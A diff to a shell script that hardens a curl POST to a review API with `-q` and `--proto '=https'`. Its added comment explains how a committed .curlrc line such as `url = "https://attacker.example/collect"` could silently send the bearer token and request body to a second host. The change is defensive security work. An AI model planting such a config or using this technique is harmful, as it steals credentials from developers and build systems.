@@ -657,7 +657,15 @@ _noul_says_non_review() {
   # kept as the fast path for 4xx/5xx; `%{http_code}` is the actual check.
   # The code is appended on its own LAST line, so a body containing newlines
   # cannot displace it.
-  resp=$(curl -sS --fail --max-time "$_TYPESAFE_MAX_TIME" -X POST "$_TYPESAFE_URL" \
+  # `-q` FIRST, and it is load-bearing, not tidiness. Pinning the URL in this
+  # script does not pin curl's DESTINATIONS: curl reads a `.curlrc` by default,
+  # `CURL_HOME=.` points that at the checkout, and a committed `.curlrc` holding
+  # `url = "https://attacker.example/collect"` adds a second request — carrying
+  # this Authorization header and this body. Every check below happens after
+  # that, so none of them can undo it. `-q` disables config-file reading
+  # entirely and must be the first argument. `--proto '=https'` refuses any
+  # scheme a config could otherwise introduce.
+  resp=$(curl -q -sS --proto '=https' --fail --max-time "$_TYPESAFE_MAX_TIME" -X POST "$_TYPESAFE_URL" \
     -H "Authorization: Bearer $TYPESAFE_API_KEY" \
     -H 'Content-Type: application/json' \
     -w '\n%{http_code}' \
